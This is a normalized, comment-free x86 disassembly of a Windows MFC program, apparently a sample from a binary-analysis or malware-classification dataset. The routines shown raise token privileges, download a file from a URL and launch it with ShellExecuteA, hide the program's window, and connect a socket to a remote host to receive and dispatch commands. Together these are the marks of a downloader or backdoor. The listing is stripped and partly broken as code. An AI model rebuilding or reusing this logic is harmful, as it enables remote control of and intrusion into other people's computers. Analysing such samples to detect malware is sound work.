mov esi esp
mov [ esp + 0x18 ] esp
push ecx
mov ecx esp
mov [ esp + 0x1c ] esp
push rw-data
call Ordinal_MFC42_537
push esi
call sub_40abd0
mov ecx [ esp + 0x44 ]
add esp 0x8
mov [ esp + 0x838 ] bl
push 0x80000002
call sub_409340
mov eax [ esp + 0x20 ]
mov ebx [ DeleteFileA@IAT ]
push eax
xor esi esi
call ebx
test eax eax
jne r-xdata
mov ecx [ esp + 0x20 ]
push 0x40
push ecx
lea ecx [ esp + 0x5c ]
call Ordinal_MFC42_353
lea ecx [ esp + 0x10 ]
mov [ esp + 0x830 ] 0xd
call Ordinal_MFC42_540
mov eax [ esp + 0x618 ]
lea ecx [ esp + 0x10 ]
push eax
push eax
mov [ esp + 0x838 ] 0xe
call Ordinal_MFC42_2919
push eax
lea ecx [ esp + 0x5c ]
call Ordinal_MFC42_5442
lea ecx [ esp + 0x54 ]
call Ordinal_MFC42_1979
mov edx [ esp + 0x18 ]
push 0x40
push edx
lea ecx [ esp + 0x4c ]
call Ordinal_MFC42_353
lea ecx [ esp + 0x1c ]
mov [ esp + 0x830 ] 0xf
call Ordinal_MFC42_540
mov eax [ esp + 0x200 ]
lea ecx [ esp + 0x1c ]
push eax
push eax
mov [ esp + 0x838 ] 0x10
call Ordinal_MFC42_2919
push eax
lea ecx [ esp + 0x4c ]
call Ordinal_MFC42_5442
lea ecx [ esp + 0x44 ]
call Ordinal_MFC42_1979
mov ebp [ esp + 0x200 ]
xor ecx ecx
test ebp ebp
jle r-xdata
jmp r-xdata
test eax eax
lea ecx [ esp + 0x10 ]
sete bl
call Ordinal_MFC42_800
test bl bl
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
lea ecx [ esp + 0x20 ]
mov [ esp + 0x830 ] 0x8
call Ordinal_MFC42_800
lea ecx [ esp + 0x28 ]
mov [ esp + 0x830 ] 0x7
call Ordinal_MFC42_800
lea ecx [ esp + 0x24 ]
mov [ esp + 0x830 ] 0x6
call Ordinal_MFC42_800
mov edi [ Sleep@IAT ]
lea ecx [ esp + 0x1c ]
mov [ esp + 0x830 ] 0xf
call Ordinal_MFC42_800
lea ecx [ esp + 0x44 ]
mov [ esp + 0x830 ] 0xe
call Ordinal_MFC42_665
lea ecx [ esp + 0x10 ]
mov [ esp + 0x830 ] 0xd
call Ordinal_MFC42_800
lea ecx [ esp + 0x54 ]
mov [ esp + 0x830 ] bl
call Ordinal_MFC42_665
lea ecx [ esp + 0x20 ]
mov [ esp + 0x830 ] 0x8
call Ordinal_MFC42_800
lea ecx [ esp + 0x28 ]
mov [ esp + 0x830 ] 0x7
call Ordinal_MFC42_800
lea ecx [ esp + 0x24 ]
mov [ esp + 0x830 ] 0x6
call Ordinal_MFC42_800
jmp r-xdata
mov eax [ esp + 0x1c ]
mov esi [ esp + 0x10 ]
sub esi eax
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
mov ecx [ esp + 0x20 ]
push ecx
call ebx
test eax eax
je r-xdata
lea ecx [ esp + 0x2c ]
mov [ esp + 0x830 ] 0x5
call Ordinal_MFC42_800
lea ecx [ esp + 0x40 ]
mov [ esp + 0x830 ] 0x4
call Ordinal_MFC42_800
lea ecx [ esp + 0x38 ]
mov [ esp + 0x830 ] 0x3
call Ordinal_MFC42_800
lea ecx [ esp + 0x18 ]
mov [ esp + 0x830 ] 0x1
call Ordinal_MFC42_800
lea ecx [ esp + 0x14 ]
mov [ esp + 0x830 ] 0x0
call Ordinal_MFC42_800
lea ecx [ esp + 0x30 ]
mov [ esp + 0x830 ] 0xffffffff
call Ordinal_MFC42_800
mov eax 0x1
lea ecx [ esp + 0x1c ]
mov [ esp + 0x830 ] 0xf
call Ordinal_MFC42_800
lea ecx [ esp + 0x44 ]
mov [ esp + 0x830 ] 0xe
call Ordinal_MFC42_665
lea ecx [ esp + 0x10 ]
mov [ esp + 0x830 ] 0xd
call Ordinal_MFC42_800
lea ecx [ esp + 0x54 ]
mov [ esp + 0x830 ] bl
call Ordinal_MFC42_665
inc ecx
inc eax
cmp ecx ebp
jl r-xdata
push 0x32
call edi
inc esi
cmp esi 0x64
jg r-xdata
mov dl [ esi + eax ]
cmp dl [ eax ]
jne r-xdata
sub_409e70
push ebp
mov ebp esp
push 0xffffffff
push sub_40e508
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x948
push ebx
push esi
mov esi ecx
push edi
xor ebx ebx
mov ecx 0x1ff
xor eax eax
lea edi [ ebp - 0x953 ]
mov [ ebp - 0x954 ] bl
mov [ ebp - 0x10 ] esp
[ edi ]
stosw [ edi ]
lea ecx [ ebp - 0x3c ]
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] ebx
stosb [ edi ]
call Ordinal_MFC42_268
push ebx
push ebx
push ebx
push ebx
push 0x1
mov [ ebp - 0x4 ] ebx
push ebx
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x4 ] 0x1
call Ordinal_MFC42_389
mov eax [ esi + 0xcc ]
push ebx
push ebx
push 0x84000002
mov eax [ eax + 0x28 ]
push ebx
push eax
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x4 ] 0x3
call Ordinal_MFC42_5207
mov edi eax
lea eax [ ebp - 0x954 ]
push 0x800
push eax
mov edx [ edi ]
mov ecx edi
call [ edx + 0x3c ]
mov edx [ edi ]
mov ecx edi
mov [ ebp - 0x14 ] eax
call [ edx + 0x54 ]
lea ecx [ ebp - 0x34 ]
call Ordinal_MFC42_1988
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x4 ] 0x1
call Ordinal_MFC42_690
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
call Ordinal_MFC42_1567
mov edx [ esi + 0xcc ]
push ecx
add edx 0x54
mov ecx esp
mov [ ebp - 0x20 ] esp
push edx
call Ordinal_MFC42_535
mov eax [ ebp - 0x14 ]
lea ecx [ ebp - 0x954 ]
push eax
push ecx
mov ecx [ esi + 0xcc ]
call sub_402d00
mov edx [ esi + 0xcc ]
mov eax [ edx + 0x4 ]
push eax
lea eax [ ebp - 0x954 ]
push eax
call [ strstr@IAT ]
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x54 ]
call Ordinal_MFC42_268
push 0x0
push 0x0
push 0x0
push 0x0
push 0x1
mov [ ebp - 0x4 ] 0x6
push 0x0
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x1c ] 0x2
call Ordinal_MFC42_389
mov ecx [ esi + 0xcc ]
push 0x0
push 0x0
push 0x84000002
mov eax [ ecx + 0x2c ]
push 0x0
push eax
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x4 ] 0x9
call Ordinal_MFC42_5207
mov ebx eax
lea edx [ ebp - 0x18 ]
push 0x0
lea eax [ ebp - 0x14 ]
push edx
push eax
push 0x20000013
mov ecx ebx
mov [ ebp - 0x4 ] 0x8
mov [ ebp - 0x18 ] 0x4
call Ordinal_MFC42_5355
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x7
lea ecx [ ebp - 0x34 ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax 0xc8
jb r-xdata
call Ordinal_MFC42_690
mov [ ebp - 0x4 ] 0xffffffff
call Ordinal_MFC42_1567
cmp eax 0x12c
jae r-xdata
mov ecx 0x3f
xor eax eax
lea edi [ ebp - 0x153 ]
mov [ ebp - 0x154 ] 0x0
[ edi ]
stosw [ edi ]
push 0x0
lea ecx [ ebp - 0x154 ]
push 0x15
push ecx
push 0x0
stosb [ edi ]
call [ SHGetSpecialFolderPathA@IAT ]
test eax eax
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ ebp - 0x154 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ ebp - 0x4c ]
call Ordinal_MFC42_354
push 0x0
lea eax [ ebp - 0x154 ]
push 0x9001
push eax
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0xb
call Ordinal_MFC42_5186
test eax eax
jne r-xdata
mov edx [ ebx ]
lea eax [ ebp - 0x954 ]
push 0x800
push eax
mov ecx ebx
call [ edx + 0x3c ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x8
call Ordinal_MFC42_665
mov edx [ ebx ]
mov ecx ebx
call [ edx + 0x54 ]
lea ecx [ ebp - 0x34 ]
call Ordinal_MFC42_1988
lea ecx [ ebp - 0x4c ]
call Ordinal_MFC42_1979
push 0x0
push 0x0
lea eax [ ebp - 0x154 ]
push 0x0
push eax
push 0x0
push 0x0
call [ ShellExecuteA@IAT ]
jmp r-xdata
lea ecx [ ebp - 0x954 ]
push eax
push ecx
lea ecx [ ebp - 0x4c ]
call Ordinal_MFC42_6385
jmp r-xdata
sub_40a180
sub esp 0x1c
lea eax [ esp ]
push eax
push 0xf01ff
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
test eax eax
jne r-xdata
lea ecx [ esp + 0x4 ]
push ecx
push rw-data
push 0x0
call [ LookupPrivilegeValueA@IAT ]
test eax eax
jne r-xdata
xor al al
add esp 0x1c
retn
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x20 ]
mov ecx [ esp + 0x8 ]
mov [ esp + 0x10 ] eax
neg edx
push 0x0
push 0x0
lea eax [ esp + 0x14 ]
mov [ esp + 0x1c ] ecx
mov ecx [ esp + 0x8 ]
push 0x10
sbb edx edx
push eax
and edx 0x2
push 0x0
push ecx
mov [ esp + 0x24 ] 0x1
mov [ esp + 0x30 ] edx
call [ AdjustTokenPrivileges@IAT ]
test eax eax
jne r-xdata
mov edx [ esp ]
push edx
call [ CloseHandle@IAT ]
xor al al
add esp 0x1c
retn
mov eax [ esp ]
push eax
call [ CloseHandle@IAT ]
mov al 0x1
add esp 0x1c
retn
mov edx [ esp ]
push edx
call [ CloseHandle@IAT ]
xor al al
add esp 0x1c
retn
sub_40a230
sub esp 0x1c
lea eax [ esp ]
push eax
push 0x1
push 0xf01ff
call [ GetCurrentThread@IAT ]
push eax
call [ OpenThreadToken@IAT ]
test eax eax
jne r-xdata
lea ecx [ esp + 0x4 ]
push ecx
push rw-data
push 0x0
call [ LookupPrivilegeValueA@IAT ]
test eax eax
jne r-xdata
xor al al
add esp 0x1c
retn
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x20 ]
mov ecx [ esp + 0x8 ]
mov [ esp + 0x10 ] eax
neg edx
push 0x0
push 0x0
lea eax [ esp + 0x14 ]
mov [ esp + 0x1c ] ecx
mov ecx [ esp + 0x8 ]
push 0x10
sbb edx edx
push eax
and edx 0x2
push 0x0
push ecx
mov [ esp + 0x24 ] 0x1
mov [ esp + 0x30 ] edx
call [ AdjustTokenPrivileges@IAT ]
test eax eax
jne r-xdata
mov edx [ esp ]
push edx
call [ CloseHandle@IAT ]
xor al al
add esp 0x1c
retn
mov eax [ esp ]
push eax
call [ CloseHandle@IAT ]
mov al 0x1
add esp 0x1c
retn
mov edx [ esp ]
push edx
call [ CloseHandle@IAT ]
xor al al
add esp 0x1c
retn
sub_40a2f0
push ebp
mov ebp esp
push 0xffffffff
push sub_40e538
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x944
push ebx
push esi
mov esi ecx
push edi
mov ecx 0x1ff
xor eax eax
lea edi [ ebp - 0x94f ]
mov [ ebp - 0x950 ] 0x0
[ edi ]
stosw [ edi ]
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x10 ] esp
stosb [ edi ]
call Ordinal_MFC42_268
push 0x0
push 0x0
push 0x0
push 0x0
push 0x1
mov [ ebp - 0x4 ] 0x0
push 0x0
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x14 ] 0x1
call Ordinal_MFC42_389
mov eax [ esi + 0xcc ]
push 0x0
push 0x0
push 0x84000002
mov eax [ eax + 0x30 ]
push 0x0
push eax
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x3
call Ordinal_MFC42_5207
lea ecx [ ebp - 0x1c ]
push 0x0
lea edx [ ebp - 0x18 ]
mov ebx eax
push ecx
push edx
push 0x20000013
mov ecx ebx
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x1c ] 0x4
call Ordinal_MFC42_5355
test eax eax
je r-xdata
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x1
call Ordinal_MFC42_690
mov [ ebp - 0x4 ] 0xffffffff
call Ordinal_MFC42_1567
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x18 ]
cmp eax 0xc8
jb r-xdata
cmp eax 0x12c
jae r-xdata
mov ecx 0x3f
xor eax eax
lea edi [ ebp - 0x14f ]
mov [ ebp - 0x150 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
push 0x0
lea eax [ ebp - 0x150 ]
push 0x15
push eax
push 0x0
call [ SHGetSpecialFolderPathA@IAT ]
test eax eax
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ ebp - 0x150 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ ebp - 0x2c ]
call Ordinal_MFC42_354
push 0x0
lea eax [ ebp - 0x150 ]
push 0x9001
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x5
call Ordinal_MFC42_5186
test eax eax
jne r-xdata
mov edx [ ebx ]
lea eax [ ebp - 0x950 ]
push 0x800
push eax
mov ecx ebx
call [ edx + 0x3c ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x2
call Ordinal_MFC42_665
mov edx [ ebx ]
mov ecx ebx
call [ edx + 0x54 ]
lea ecx [ ebp - 0x40 ]
call Ordinal_MFC42_1988
lea ecx [ ebp - 0x2c ]
call Ordinal_MFC42_1979
push 0x0
push 0x0
lea eax [ ebp - 0x150 ]
push 0x0
push eax
push 0x0
push 0x0
call [ ShellExecuteA@IAT ]
jmp r-xdata
lea ecx [ ebp - 0x950 ]
push eax
push ecx
lea ecx [ ebp - 0x2c ]
call Ordinal_MFC42_6385
jmp r-xdata
sub_40a510
push 0xffffffff
push sub_40e558
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push esi
push edi
mov esi ecx
push eax
push 0x66
mov [ esp + 0x10 ] esi
call Ordinal_MFC42_324
xor edi edi
mov [ esi ] r--data
mov [ esp + 0x14 ] edi
call Ordinal_MFC42_1168
push 0x80
push 0xe
push 0x80
call Ordinal_MFC42_1146
push eax
call [ LoadIconA@IAT ]
mov ecx [ esp + 0xc ]
mov [ esi + 0x78 ] eax
mov [ esi + 0x64 ] edi
mov [ esi + 0x68 ] edi
mov [ esi + 0x6c ] edi
mov [ esi + 0x70 ] edi
mov [ esi + 0x74 ] edi
mov eax esi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_40a5e0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_40e580
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push esi
push edi
mov esi ecx
call Ordinal_MFC42_4710
mov eax [ esi + 0x78 ]
mov edi [ SendMessageA@IAT ]
push eax
mov eax [ esi + 0x20 ]
push 0x1
push 0x80
push eax
call edi
mov eax [ esi + 0x78 ]
mov ecx [ esi + 0x20 ]
push eax
push 0x0
push 0x80
push ecx
call edi
push 0x1
push 0x0
push 0x0
push 0x0
push 0x0
mov ecx esi
call Ordinal_MFC42_4299
test esi esi
jne r-xdata
mov eax [ esi + 0x20 ]
xor eax eax
jmp r-xdata
push 0x20080
push 0xffffffec
push eax
call [ SetWindowLongA@IAT ]
call sub_40ab60
mov edx [ eax + 0xcc ]
push ecx
add edx 0x38
mov ecx esp
mov [ esp + 0x14 ] esp
push edx
call Ordinal_MFC42_535
lea eax [ esp + 0x10 ]
push eax
call sub_40abd0
add esp 0x8
push eax
lea ecx [ esp + 0xc ]
push rw-data
push ecx
mov [ esp + 0x28 ] 0x0
call Ordinal_MFC42_926
mov eax [ eax ]
mov ecx esi
push eax
mov [ esp + 0x20 ] 0x1
call Ordinal_MFC42_6199
lea ecx [ esp + 0x8 ]
mov [ esp + 0x1c ] 0x0
call Ordinal_MFC42_800
lea ecx [ esp + 0xc ]
mov [ esp + 0x1c ] 0xffffffff
call Ordinal_MFC42_800
mov edx [ esi + 0x20 ]
mov edi [ SetTimer@IAT ]
push 0x0
push 0x1
push 0x4
push edx
call edi
call Ordinal_MFC42_1168
mov eax [ eax + 0x4 ]
mov ecx [ eax + 0xd0 ]
mov [ esi + 0x60 ] ecx
call sub_403330
mov eax [ esi + 0x20 ]
push 0x0
push 0x3e8
push 0x1
push eax
call edi
push 0x1
mov ecx esi
call sub_40a870
push 0xc8
call [ Sleep@IAT ]
push 0x3
mov ecx esi
call sub_40a870
mov ecx [ esi + 0x20 ]
push 0x0
push 0xea60
push 0x3
push ecx
call edi
mov ecx [ esp + 0x14 ]
pop edi
mov eax 0x1
mov [ fs : 0x0 ] ecx
pop esi
add esp 0x18
retn
sub_40a740
push esi
mov esi ecx
push edi
mov edi [ TerminateThread@IAT ]
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov eax [ esi + 0x68 ]
test eax eax
je r-xdata
mov eax [ eax + 0x2c ]
push 0x0
push eax
call edi
mov eax [ esi + 0x6c ]
test eax eax
je r-xdata
mov ecx [ eax + 0x2c ]
push 0x0
push ecx
call edi
mov eax [ esi + 0x70 ]
test eax eax
je r-xdata
mov edx [ eax + 0x2c ]
push 0x0
push edx
call edi
mov eax [ esi + 0x74 ]
test eax eax
je r-xdata
mov eax [ eax + 0x2c ]
push 0x0
push eax
call edi
mov ecx esi
call Ordinal_MFC42_2379
pop edi
pop esi
retn
mov ecx [ eax + 0x2c ]
push 0x0
push ecx
call edi
sub_40a7a0
sub esp 0x64
push esi
mov esi ecx
mov eax [ esi + 0x20 ]
push eax
call [ IsIconic@IAT ]
test eax eax
je r-xdata
mov ecx esi
call Ordinal_MFC42_2379
pop esi
add esp 0x64
retn
push ebx
push edi
push esi
lea ecx [ esp + 0x20 ]
call Ordinal_MFC42_470
mov edi [ esp + 0x20 ]
lea eax [ esp + 0x1c ]
mov ecx [ esi + 0x20 ]
push 0x0
neg eax
sbb eax eax
and eax edi
push eax
push 0x27
push ecx
call [ SendMessageA@IAT ]
mov edi [ GetSystemMetrics@IAT ]
push 0xb
call edi
push 0xc
mov ebx eax
call edi
mov edi eax
mov eax [ esi + 0x20 ]
lea edx [ esp + 0xc ]
push edx
push eax
call [ GetClientRect@IAT ]
mov ecx [ esi + 0x78 ]
mov eax [ esp + 0x18 ]
push ecx
mov ecx [ esp + 0x14 ]
sub eax ecx
sub eax edi
inc eax
cdq
sub eax edx
mov edx [ esp + 0x10 ]
sar eax 0x1
push eax
mov eax [ esp + 0x1c ]
sub eax edx
sub eax ebx
inc eax
cdq
sub eax edx
mov edx [ esp + 0x28 ]
sar eax 0x1
push eax
push edx
call [ DrawIcon@IAT ]
lea ecx [ esp + 0x1c ]
call Ordinal_MFC42_755
pop edi
pop ebx
pop esi
add esp 0x64
retn
sub_40a870
mov eax [ esp + 0x4 ]
push esi
cmp eax 0x1
mov esi ecx
jne r-xdata
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
cmp eax 0x3
jne r-xdata
mov eax [ esi + 0x68 ]
test eax eax
je r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push sub_40a9d0
call Ordinal_MFC42_1105
mov [ esi + 0x64 ] eax
mov [ eax + 0x28 ] 0x0
pop esi
retn 0x4
mov edx [ eax + 0x2c ]
lea ecx [ esp + 0x8 ]
push ecx
push edx
call [ GetExitCodeThread@IAT ]
cmp [ esp + 0x8 ] 0x103
je r-xdata
cmp eax 0x4
jne r-xdata
mov eax [ esi + 0x6c ]
test eax eax
je r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push sub_40aa40
call Ordinal_MFC42_1105
mov [ esi + 0x68 ] eax
mov [ eax + 0x28 ] 0x0
pop esi
retn 0x4
mov edx [ eax + 0x2c ]
lea ecx [ esp + 0x8 ]
push ecx
push edx
call [ GetExitCodeThread@IAT ]
cmp [ esp + 0x8 ] 0x103
je r-xdata
pop esi
retn 0x4
cmp eax 0x5
jne r-xdata
push eax
mov eax [ esi + 0x20 ]
push eax
call [ KillTimer@IAT ]
push 0x0
mov ecx esi
call Ordinal_MFC42_6215
pop esi
retn 0x4
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push sub_40aaa0
call Ordinal_MFC42_1105
mov [ esi + 0x6c ] eax
mov [ eax + 0x28 ] 0x0
pop esi
retn 0x4
mov edx [ eax + 0x2c ]
lea ecx [ esp + 0x8 ]
push ecx
push edx
call [ GetExitCodeThread@IAT ]
cmp [ esp + 0x8 ] 0x103
je r-xdata
mov ecx [ esi + 0x20 ]
push eax
push ecx
call [ KillTimer@IAT ]
mov eax [ esi + 0x74 ]
test eax eax
je r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push sub_40aae0
call Ordinal_MFC42_1105
mov [ esi + 0x74 ] eax
mov [ eax + 0x28 ] 0x0
mov eax [ eax + 0x2c ]
lea edx [ esp + 0x8 ]
push edx
push eax
call [ GetExitCodeThread@IAT ]
cmp [ esp + 0x8 ] 0x103
je r-xdata
sub_40a9d0
push esi
push edi
call Ordinal_MFC42_1168
mov eax [ eax + 0x4 ]
mov edi [ eax + 0xcc ]
call Ordinal_MFC42_1175
test eax eax
je r-xdata
xor esi esi
mov edx [ eax ]
mov ecx eax
call [ edx + 0x7c ]
mov esi eax
jmp r-xdata
pop edi
xor eax eax
pop esi
retn
mov eax [ esi + 0x20 ]
push 0x1
push eax
call [ KillTimer@IAT ]
mov ecx [ esi + 0x20 ]
mov edi [ SetTimer@IAT ]
push 0x0
push 0xea60
push 0x2
push ecx
call edi
mov edx [ esi + 0x20 ]
push 0x0
push 0x3e8
push 0x5
push edx
call edi
mov ecx edi
call sub_4017f0
test eax eax
je r-xdata
sub_40aa40
push esi
push edi
call Ordinal_MFC42_1168
mov eax [ eax + 0x4 ]
mov edi [ eax + 0xcc ]
call Ordinal_MFC42_1175
test eax eax
je r-xdata
xor esi esi
mov edx [ eax ]
mov ecx eax
call [ edx + 0x7c ]
mov esi eax
jmp r-xdata
pop edi
xor eax eax
pop esi
retn
nop
nop
nop
nop
nop
nop
nop
nop
mov eax [ esi + 0x20 ]
push 0x2
push eax
call [ KillTimer@IAT ]
mov ecx [ esi + 0x20 ]
push 0x0
push 0x3e8
push 0x1
push ecx
call [ SetTimer@IAT ]
push 0x0
mov ecx edi
call sub_401970
test eax eax
jne r-xdata
sub_40ab00
mov eax [ esp + 0x8 ]
push esi
dec eax
mov esi ecx
je r-xdata
mov eax [ esi + 0x70 ]
test eax eax
je r-xdata
sub eax 0x1f
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push sub_40aac0
call Ordinal_MFC42_1105
mov [ esi + 0x70 ] eax
mov [ eax + 0x28 ] 0x0
mov edx [ eax + 0x2c ]
lea ecx [ esp + 0xc ]
push ecx
push edx
call [ GetExitCodeThread@IAT ]
cmp [ esp + 0xc ] 0x103
je r-xdata
pop esi
retn 0x8
mov ecx [ esi + 0x60 ]
call sub_403350
pop esi
retn 0x8
sub_40abd0
push 0xffffffff
push sub_40e5bd
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x208
push ebx
xor ebx ebx
push esi
push edi
mov [ esp + 0x10 ] ebx
push rw-data
lea ecx [ esp + 0x10 ]
mov [ esp + 0x220 ] 0x1
call Ordinal_MFC42_537
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x15 ]
mov [ esp + 0x14 ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x115 ]
mov [ esp + 0x114 ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov eax [ esp + 0x228 ]
mov [ esp + 0x21c ] 0x2
mov esi [ eax - 0x8 ]
cmp esi 0x100
jle r-xdata
push eax
lea eax [ esp + 0x18 ]
push rw-data
push eax
call [ sprintf@IAT ]
add esp 0xc
xor eax eax
cmp esi ebx
jle r-xdata
mov esi [ esp + 0x224 ]
push rw-data
mov ecx esi
call Ordinal_MFC42_537
mov [ esp + 0x10 ] 0x1
jmp r-xdata
lea edx [ esp + 0x114 ]
lea ecx [ esp + 0xc ]
push edx
call Ordinal_MFC42_860
mov esi [ esp + 0x224 ]
push eax
mov ecx esi
call Ordinal_MFC42_535
mov [ esp + 0x10 ] 0x1
mov cl [ esp + eax + 0x14 ]
add cl 0x4
mov [ esp + eax + 0x114 ] cl
inc eax
cmp eax esi
jl r-xdata
lea ecx [ esp + 0xc ]
mov [ esp + 0x21c ] 0x1
call Ordinal_MFC42_800
lea ecx [ esp + 0x228 ]
mov [ esp + 0x21c ] bl
call Ordinal_MFC42_800
mov ecx [ esp + 0x214 ]
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x214
retn
sub_40ad10
sub esp 0xc1c
push ebx
push esi
push edi
xor ebx ebx
mov ecx 0x200
xor eax eax
lea edi [ esp + 0x121 ]
mov [ esp + 0x120 ] bl
[ edi ]
lea eax [ esp + 0x924 ]
push eax
push 0x202
call [ WSAStartup@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0xc1c
retn
lea ecx [ esp + 0xc ]
mov [ esp + 0xc ] ebx
push ecx
push ebx
push ebx
call [ WSAEnumProtocolsA@IAT ]
cmp eax 0xffffffff
jne r-xdata
mov edx [ esp + 0xc ]
push edx
call [ malloc@IAT ]
mov esi eax
lea eax [ esp + 0xab8 ]
lea ecx [ esp + 0x10 ]
push eax
push ecx
push esi
push 0x1
push 0x6
call sub_40c630
push esi
call [ free@IAT ]
add esp 0x1c
push 0x1
push ebx
push ebx
push ebx
push 0x1
push 0x2
call [ WSASocketA@IAT ]
cmp eax 0xffffffff
mov [ rw-data ] eax
je r-xdata
call [ WSAGetLastError@IAT ]
cmp eax 0x2747
jne r-xdata
lea edx [ esp + 0x10 ]
push 0x4
push edx
push 0x1002
push 0xffff
push eax
mov [ esp + 0x24 ] ebx
call [ setsockopt@IAT ]
push 0x1d5f
mov [ rw-data ] 0x2
call [ htons@IAT ]
mov [ rw-data ] ax
mov eax [ rw-data ]
push eax
call [ inet_addr@IAT ]
mov ecx [ rw-data ]
push 0x10
push rw-data
push ecx
mov [ rw-data ] eax
call [ connect@IAT ]
cmp eax 0xffffffff
je r-xdata
mov edx [ rw-data ]
mov esi [ strncmp@IAT ]
push ebp
mov ebp [ recv@IAT ]
mov [ esp + 0x18 ] ebx
mov [ esp + 0x1c ] ebx
mov [ esp + 0x20 ] 0x1
mov [ esp + 0x28 ] edx
lea eax [ esp + 0x18 ]
lea ecx [ esp + 0x20 ]
push eax
push ebx
push ebx
push ecx
push ebx
call [ select@IAT ]
test eax eax
je r-xdata
mov ecx 0x200
xor eax eax
lea edi [ esp + 0x124 ]
push ebx
[ edi ]
stosb [ edi ]
mov eax [ rw-data ]
lea edx [ esp + 0x128 ]
push 0x800
push edx
push eax
call ebp
push 0x7
lea ecx [ esp + 0x128 ]
push rw-data
push ecx
mov [ esp + eax + 0x130 ] bl
call esi
add esp 0xc
test eax eax
je r-xdata
mov edx [ rw-data ]
mov eax [ rw-data ]
push edx
push eax
call sub_40c090
add esp 0x8
jmp r-xdata
push 0x3
lea edx [ esp + 0x128 ]
push rw-data
push edx
call esi
add esp 0xc
test eax eax
jne r-xdata
push 0xa
lea ecx [ esp + 0x128 ]
push rw-data
push ecx
call esi
add esp 0xc
test eax eax
jne r-xdata
lea eax [ esp + 0x124 ]
push eax
call sub_40aff0
lea edi [ esp + 0x128 ]
or ecx 0xffffffff
xor eax eax
add esp 0x4
[ edi ]
not ecx
dec ecx
je r-xdata
push 0xa
lea eax [ esp + 0x128 ]
push rw-data
push eax
call esi
add esp 0xc
test eax eax
jne r-xdata
mov edx [ rw-data ]
push edx
call sub_40bfb0
add esp 0x4
jmp r-xdata
push 0x7
lea ecx [ esp + 0x128 ]
push rw-data
push ecx
call esi
add esp 0xc
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ebx
cmp eax ebx
mov [ rw-data ] ebx
mov [ rw-data ] eax
pop ebp
je r-xdata
mov ecx [ rw-data ]
push ecx
call [ closesocket@IAT ]
mov ecx [ eax + 0x88 ]
mov esi [ free@IAT ]
push ecx
call esi
mov edx [ rw-data ]
mov eax [ edx + 0x80 ]
push eax
call esi
mov ecx [ rw-data ]
add esp 0x8
mov [ ecx + 0x8c ] ebx
mov edx [ rw-data ]
mov [ edx + 0x90 ] ebx
mov eax [ rw-data ]
mov eax [ eax + 0x94 ]
cmp eax ebx
